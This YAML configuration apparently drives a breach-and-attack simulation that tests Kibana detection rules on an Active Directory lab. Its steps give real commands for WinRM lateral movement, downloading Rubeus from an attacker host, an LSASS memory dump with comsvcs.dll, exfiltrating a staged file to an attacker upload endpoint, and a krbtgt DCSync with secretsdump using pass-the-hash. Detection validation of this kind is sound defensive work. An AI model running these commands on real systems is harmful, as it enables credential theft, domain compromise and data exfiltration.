campaign_id: SB-AD
campaign_name: Spacebar AD Detection Validation
description: Validates the current SB-AD Kibana detection rules. Includes Gahyun's existing 2-6 rules and Junseo's confirmed 10-13, 15, 16, and 19 rules. Excludes missing, paused, and not-yet-implemented techniques.

flow:
  - order: 2
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "02. Windows Command Shell"
    technique_id: T1059.003
    requires: [windows, cmd, sysmon]
    params:
      behavior: windows_command_shell
      technique_id: T1059.003
      scenario_order: 2
      execution_host: PC01
      risk: high
      description: Launches cmd.exe from the BAS agent context to match the existing command-shell detection.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: cmd-whoami
          executor: local
          agent_role: pc01
          platform: windows
          shell: cmd
          timeout: 20
          command: whoami

  - order: 3
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "03. Non-Application Layer Protocol"
    technique_id: T1095
    requires: [windows, powershell, sysmon, network]
    params:
      behavior: non_application_tcp_connection
      technique_id: T1095
      scenario_order: 3
      execution_host: PC01
      risk: high
      description: Opens a non-web outbound TCP connection from PC01 to the attacker host.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: outbound-non-web-port-check
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 30
          command: >-
            Test-NetConnection {{ attacker_public_ip }} -Port {{ suspicious_ssh_port }} | Out-String

  - order: 4
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "04. Domain Account Discovery"
    technique_id: T1087.002
    requires: [windows, cmd, sysmon, active_directory]
    params:
      behavior: domain_account_discovery
      technique_id: T1087.002
      scenario_order: 4
      execution_host: PC01
      risk: low
      description: Enumerates domain groups with net.exe to match the existing account-discovery rule.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: net-group-domain
          executor: local
          agent_role: pc01
          platform: windows
          shell: cmd
          timeout: 30
          command: net group /domain

  - order: 5
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "05. Remote System Discovery"
    technique_id: T1018
    requires: [windows, cmd, sysmon, active_directory]
    params:
      behavior: remote_system_discovery
      technique_id: T1018
      scenario_order: 5
      execution_host: PC01
      risk: low
      description: Queries domain controllers to generate remote-system discovery telemetry.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: nltest-dclist
          executor: local
          agent_role: pc01
          platform: windows
          shell: cmd
          timeout: 30
          command: nltest /dclist:{{ domain }}

  - order: 6
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "06. System Owner/User Discovery"
    technique_id: T1033
    requires: [windows, cmd, sysmon]
    params:
      behavior: system_owner_user_discovery
      technique_id: T1033
      scenario_order: 6
      execution_host: PC01
      risk: low
      description: Runs whoami.exe to identify the current user context.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: whoami-user-context
          executor: local
          agent_role: pc01
          platform: windows
          shell: cmd
          timeout: 20
          command: whoami

  - order: 10
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "10. WinRM Remote Execution"
    technique_id: T1021.006
    requires: [windows, powershell, winrm, sysmon, windows_security]
    params:
      behavior: winrm_remote_execution
      technique_id: T1021.006
      scenario_order: 10
      execution_host: PC01_to_FS01
      risk: high
      description: Uses svc_file credentials to execute a simple command on FS01 over WinRM.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: invoke-command-fs01
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 45
          command: >-
            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock { hostname; whoami; Get-Date }

  - order: 11
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "11. PowerShell Over WinRM"
    technique_id: T1059.001
    requires: [windows, powershell, winrm, sysmon]
    depends_on_orders: [10]
    params:
      behavior: powershell_over_winrm
      technique_id: T1059.001
      scenario_order: 11
      execution_host: FS01
      risk: high
      description: Runs PowerShell script block content on FS01 through WinRM.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: powershell-winrm-scriptblock
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 45
          command: >-
            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock { powershell.exe -NoProfile -Command "whoami; Get-Date" }

  - order: 12
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "12. Ingress Tool Transfer"
    technique_id: T1105
    requires: [windows, powershell, winrm, powershell_logging, sysmon]
    depends_on_orders: [10]
    params:
      behavior: ingress_tool_transfer
      technique_id: T1105
      scenario_order: 12
      execution_host: FS01
      risk: medium
      description: Downloads a tool from the attacker web server to FS01.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: download-rubeus-to-fs01
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 60
          command: >-
            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
              Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_http_port }}/Rubeus.exe" -OutFile "{{ tool_drop_path }}" -UseBasicParsing
            }

  - order: 13
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "13. LSASS Memory Dump"
    technique_id: T1003.001
    requires: [windows, powershell, sysmon]
    depends_on_orders: [10]
    params:
      behavior: lsass_memory_dump
      technique_id: T1003.001
      scenario_order: 13
      execution_host: FS01
      risk: critical
      description: Creates an LSASS minidump on FS01 using rundll32 and comsvcs.dll.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_CREDENTIAL_TESTS]
      commands:
        - name: dump-lsass-fs01
          executor: local
          agent_role: fs01
          platform: windows
          shell: powershell
          timeout: 60
          command: >-
            $pid = (Get-Process lsass).Id;
            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid "{{ fs01_temp_dir }}\lsass.dmp" full

  - order: 15
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "15. Local Data Staging"
    technique_id: T1074.001
    requires: [windows, powershell, winrm, sysmon]
    depends_on_orders: [10]
    params:
      behavior: local_data_staging
      technique_id: T1074.001
      scenario_order: 15
      execution_host: FS01
      risk: high
      description: Creates staged synthetic artifacts in the FS01 public share through the svc_file WinRM session.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: stage-synthetic-files-fs01
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 45
          command: >-
            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force;
              "BAS synthetic credential artifact only" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
              "BAS synthetic customer rows only" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
            }

  - order: 16
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "16. Exfiltration Over C2 Channel"
    technique_id: T1041
    requires: [windows, powershell, winrm, sysmon, windows_security]
    depends_on_orders: [15]
    params:
      behavior: exfiltration_over_c2
      technique_id: T1041
      scenario_order: 16
      execution_host: FS01
      risk: high
      description: Sends a staged synthetic artifact to the attacker upload endpoint over an external HTTP channel.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
      commands:
        - name: post-synthetic-artifact-to-attacker
          executor: local
          agent_role: pc01
          platform: windows
          shell: powershell
          timeout: 60
          command: >-
            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
              Invoke-WebRequest -Uri "http://{{ attacker_public_ip }}:{{ attacker_upload_port }}/upload" -Method POST -InFile "{{ fs01_public_share }}\{{ staged_customer_name }}" -UseBasicParsing
            }

  - order: 19
    phase: attack
    module: attack.sb_ad_technique
    target: SB-AD
    name: "19. DCSync Replication Request"
    technique_id: T1003.006
    requires: [attacker_host, impacket, windows_security]
    params:
      behavior: dcsync_replication
      technique_id: T1003.006
      scenario_order: 19
      execution_host: Attacker
      risk: critical
      description: Uses Impacket secretsdump to request krbtgt replication data from DC01.
      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS]
      commands:
        - name: secretsdump-dcsync-krbtgt
          executor: local
          agent_role: attacker
          platform: linux
          shell: bash
          timeout: 120
          command: >-
            cd {{ impacket_examples_dir }} &&
            python3 secretsdump.py -hashes :$BAS_DA_NTLM_HASH '{{ netbios_domain }}/{{ admin_user }}@{{ dc01_private_ip }}' -just-dc-user krbtgt
